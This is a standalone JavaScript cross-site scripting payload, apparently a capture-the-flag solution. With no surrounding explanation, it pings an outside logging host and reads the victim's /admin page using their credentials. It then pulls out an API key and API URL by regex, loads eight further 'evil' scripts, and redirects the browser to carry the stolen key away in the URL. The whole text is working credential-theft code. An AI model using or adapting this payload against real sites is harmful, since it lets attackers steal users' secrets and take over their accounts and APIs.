(async () => {
  if (window.running) {
    console.log("already running another xss");
    return;
  }
  window.running = true;
  fetch('http://terjanq.me:12345/log?test', {mode: 'no-cors'});
  const dummy = await (await fetch('/admin', { credentials: 'include' })).text()
  const leak = await (await fetch('/admin', { credentials: 'include' })).text()
  console.log(`[*] html: ${leak}`)
  const apiKey = leak.match(/id="api-key">([0-9a-f]+)</)[1]
  const apiUrl = leak.match(/id="api-url">([^<]+)</)[1]   // http://api:9090
  console.log(`[*] apiKey: ${apiKey}`)
  console.log(`[*] apiUrl: ${apiUrl}`)

  for (let i = 0; i < 8; i++) {
    var s = document.createElement('script');
    s.setAttribute('src',`http://localhost:3000/view/evil/extract.js?q=${i}`);
    document.head.appendChild(s);
  }
  location = "http://localhost:3000/view/evil/extract.html#" + encodeURIComponent(apiKey)


})();
